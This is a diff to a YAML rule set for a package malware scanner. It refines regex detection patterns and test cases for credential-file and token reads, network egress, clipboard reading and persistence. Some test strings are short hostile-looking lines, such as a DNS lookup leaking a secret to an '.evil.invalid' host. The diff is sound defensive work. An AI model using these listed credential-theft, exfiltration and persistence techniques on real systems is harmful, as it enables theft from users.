@@ -262,10 +262,10 @@ rules:
       patterns:
         - '\bdict\s*\(\s*os\s*\.\s*environ\s*\)'
         - '\bos\s*\.\s*environ\s*\.\s*(?:copy|items|keys|values)\s*\('
-        - '\bjson\s*\.\s*dumps\s*\(\s*(?:dict\s*\()?\s*os\s*\.\s*environ'
+        - '\bjson\s*\.\s*dumps\s*\(\s*(?:dict\s*\(\s*)?os\s*\.\s*environ'
         - '\.ssh/|id_rsa|id_ed25519'
         - '\.aws/credentials|\.config/gcloud|\.pypirc|\.netrc|\.kube/config'
-        - '\bos\s*\.\s*environ\s*(?:\.get\s*\(\s*)?\[?\s*["''](?:AWS_SECRET_ACCESS_KEY|PYPI_TOKEN|GITHUB_TOKEN|NPM_TOKEN)'
+        - '\bos\s*\.\s*environ\s*(?:\.get\s*\(\s*)?(?:\[\s*)?["''](?:AWS_SECRET_ACCESS_KEY|PYPI_TOKEN|GITHUB_TOKEN|NPM_TOKEN)'
     tests:
       positive:
         - "payload = dict(os.environ)"
@@ -307,7 +307,7 @@ rules:
         # The Windows identity variables, which is how this is written on the
         # platform these campaigns target. `os.environ["PATH"]` is not identity and
         # is deliberately absent.
-        - '\bos\s*\.\s*environ\s*(?:\.get\s*\(\s*)?\[?\s*["''](?:COMPUTERNAME|USERNAME|USERPROFILE|USERDOMAIN|HOSTNAME|LOGNAME)["'']'
+        - '\bos\s*\.\s*environ\s*(?:\.get\s*\(\s*)?(?:\[\s*)?["''](?:COMPUTERNAME|USERNAME|USERPROFILE|USERDOMAIN|HOSTNAME|LOGNAME)["'']'
     tests:
       positive:
         - "host = socket.gethostname()"
@@ -346,7 +346,13 @@ rules:
         - '\burllib\s*\.\s*request\s*\.\s*urlopen\s*\('
         - '\burlopen\s*\('
         - '\bhttpx\s*\.\s*(?:get|post|put|patch|request|Client)\s*\('
-        - '\bsocket\s*\.\s*(?:socket|create_connection)\s*\('
+        # Egress is a connection *out*, not a socket object: a server calls `socket.socket()` too
+        # and then binds and listens, sending nothing (census D, bind-serve vs connect-exec:
+        # ESocketS, PyWCGIshell). `create_connection` connects; a bare socket is scored only when it
+        # connects to a `(host, port)` tuple -- which a reverse shell or beacon does and a listener
+        # does not -- while `bind`/`listen`/`accept` stay unscored.
+        - '\bsocket\s*\.\s*create_connection\s*\('
+        - '\.\s{0,4}connect\s{0,4}\(\s{0,4}\('
         - '\bhttp\s*\.\s*client\s*\.\s*HTTP(?:S)?Connection\s*\('
         # Additions. Every allow-list of method names is a list the attacker
         # reads too, and these were the holes: a real download primitive, the
@@ -371,9 +377,12 @@ rules:
         - "urllib.request.urlretrieve(url, '/tmp/x')"
         - "socket.gethostbyname(secret + '.evil.invalid')"
         - "smtplib.SMTP('mail.example.invalid')"
+        - "s.connect((host, port))"
       negative:
         - "response = cache.get(key)"
         - "# requests are proxied through the gateway"
+        # A server binds and listens: it creates a socket and sends nothing out.
+        - "srv = socket.socket()\nsrv.bind((host, port))\nsrv.listen(5)\nconn, addr = srv.accept()"
 
   - id: CAP.PY.SOCKET_LITERAL.001
     version: 1.0.0
@@ -405,6 +414,35 @@ rules:
   # ---------------------------------------------------------------------
   # PERSIST
   # ---------------------------------------------------------------------
+  - id: CAP.PY.CLIPBOARD.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: credential
+    title: Reads the clipboard
+    message: >
+      This file reads what the user last copied. A copied password, token, seed phrase or wallet
+      address is there; read beside a request, it is a source an exfiltration needs.
+    remediation: Confirm the clipboard is read only for the feature that needs it, and never sent.
+    provenance:
+      kind: research
+      reference: A clipboard stealer posting pyperclip.paste() to a webhook from import (review 98).
+    languages: [python]
+    match:
+      kind: regex
+      patterns:
+        - '\bpyperclip\s{0,4}\.\s{0,4}paste\s{0,4}\('
+        - '\bGetClipboardData\s{0,4}\('
+        - '\.\s{0,4}clipboard_get\s{0,4}\('
+        - '\bImageGrab\s{0,4}\.\s{0,4}grabclipboard\s{0,4}\('
+    tests:
+      positive:
+        - "data = pyperclip.paste()"
+        - "text = win32clipboard.GetClipboardData()"
+      negative:
+        - "pyperclip.copy(result)"
+
   - id: CAP.PY.PERSIST.001
     version: 1.0.0
     category: policy
@@ -432,7 +470,9 @@ rules:
         # `home + "/.profile"` -- and the JavaScript rule has recorded this since the
         # corpus first measured it.
         - '\.bashrc|\.bash_profile|\.zshrc|[/~]\.profile(?![\w-])'
-        - 'crontab\b|/etc/cron'
+        # Not a package name: `python-crontab` in `install_requires` is a dependency, and
+        # `docker-cron` and `pibackup` were blocked for declaring it (review 98).
+        - '(?<![\w-])crontab\b(?!-)|/etc/cron'
         - 'LaunchAgents|LaunchDaemons'
         # And NOT a bare `.service`, for the reason the JavaScript rule gives about
         # `x.service.ts`: it is also how a name ends. `odoo` declares
@@ -446,10 +486,16 @@ rules:
         - '["''`]systemd["''`][ \t]{0,4},[ \t]{0,4}["''`](?:system|user)["''`]'
         - 'systemctl[ \t]{1,4}(?:--user[ \t]{1,4})?enable\b'
         - 'WantedBy=(?:default|multi-user)\.target'
-        - 'CurrentVersion\\\\Run'
+        # The registry key a login runs, spelled as Python source does: one escaped backslash or a raw
+        # string's single one (review 98: a clipboard stealer's `winreg` Run entry was missed).
+        - 'CurrentVersion\\{1,2}Run'
         - 'sitecustomize\.py|usercustomize\.py'
+        # The Windows Startup folder, written whole or joined from parts.
+        - '(?i:start[ _]menu[\x22\x27\\\\/ ,]{1,8}programs[\x22\x27\\\\/ ,]{1,8}startup\b)'
+        - '(?i:shell:startup\b)'
     tests:
       positive:
+        - "os.path.join(appdata, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')"
         - "open(home + '/.bashrc', 'a').write(line)"
         - "subprocess.run(['crontab', '-'])"
         - "path = site_packages / 'sitecustomize.py'"
@@ -756,4 +802,5 @@ rules:
       negative:
         - "import socket\nsocket.gethostbyname('api.example.com')"
         - "import socket\nsocket.gethostbyname(host)"
+        - "import socket\nsocket.gethostbyname(get_hostname())"
         - "self.gethostbyname(x + y)"
